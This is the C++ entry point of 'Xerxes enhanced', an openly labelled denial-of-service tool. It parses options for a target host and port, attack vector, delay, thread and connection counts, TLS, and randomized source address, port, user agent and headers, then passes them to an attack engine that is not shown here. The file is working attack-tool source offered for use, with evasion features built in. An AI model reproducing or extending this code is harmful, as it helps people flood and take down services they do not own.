#include <iostream>
#include <string>
#include <args.hxx>
#include <memory>
#include <algorithm>
#include <csignal>


#include "engine.h"
#include "utils.h"

const char *__author__ = "Sepehrdad Sh";
const char *__license__ = "GPLv3";
const char *__version__ = "2.0alpha";
const char *__project__ = "Xerxes enhanced";

void version(){
    printf("%s v%s\n", __project__, __version__);
}

void banner(){
    printf("--==[ %s by %s ]==--\n\n", __project__, __author__);
}

void exit_signal(int){
    exit(EXIT_SUCCESS);
}

void broke(int){
    // pass
}

void init_signals(){
    signal(SIGINT, &exit_signal);
    signal(SIGABRT, &exit_signal);
    signal(SIGTERM, &exit_signal);
    signal(SIGTSTP, &exit_signal);
    signal(SIGPIPE, &broke);
}



int main(int argc, const char *argv[]){
    banner();
    args::ArgumentParser parser("Xerxes dos tool enhanced");
    args::HelpFlag help(parser, "help", "display this help menu", {'h', "help"});
    args::Flag ver(parser, "version", "display version", {'v', "version"});
    args::Flag vects(parser, "available vectors", "display available vectors", {'V', "vectors"});
    args::ValueFlag<std::string> rhost(parser, "rhost", "remote host address [default 127.0.0.1]"
            , {"rhost"}, "127.0.0.1");
    args::ValueFlag<std::string> rport(parser, "rport", "remote host port [default 80]", {"rport"}, "80");
    args::ValueFlag<int> vec(parser,  "vector", "attack vector [default 0]", {"vec"}, 0);
    args::ValueFlag<int> dly(parser,  "delay", "attack delay [default 1 ns]", {"dly"}, 1);
    args::ValueFlag<int> trds(parser,  "threads", "number of threads [default 10]", {"trds"}, 10);
    args::ValueFlag<int> conn(parser,  "connections", "number of connections [default 25]", {"conn"}, 25);
    args::Flag tls(parser, "enable tls", "enable tls", {"tls"});
    args::Flag randomize_host(parser, "randomize lhost", "enable local host randomization", {"rand-lhost"});
    args::Flag randomize_port(parser, "randomize lport", "enable local port randomization", {"rand-lport"});
    args::Flag randomize_useragent(parser, "randomize useragent", "enable useragent randomization", {"rand-usr"});
    args::Flag randomize_hdr(parser, "randomize header", "enable http header randomization", {"rand-hdr"});

    try{
        parser.ParseCLI(argc, argv);
    }catch(args::Help&){
        std::cout << parser;
        return 0;
    }catch(args::ParseError& e){
        std::cerr << e.what() << std::endl;
        std::cerr << parser;
        return 1;
    }

    if(ver){
        version();
        exit(EXIT_SUCCESS);
    }
    init_signals();
    std::shared_ptr<Config> config = std::make_shared<Config>();
    utils::set_dly(args::get(dly), &config->time);
    config->rhost = args::get(rhost);
    config->rport = args::get(rport);
    config->vec = args::get(vec);
    config->conn = args::get(conn);
    config->trds = args::get(trds);
    config->tls = tls;
    config->rand_hdr = randomize_hdr;
    config->rand_lhost = randomize_host;
    config->rand_lport = randomize_port;
    config->rand_usr = randomize_useragent;
    engine eng{config};

    return 0;
}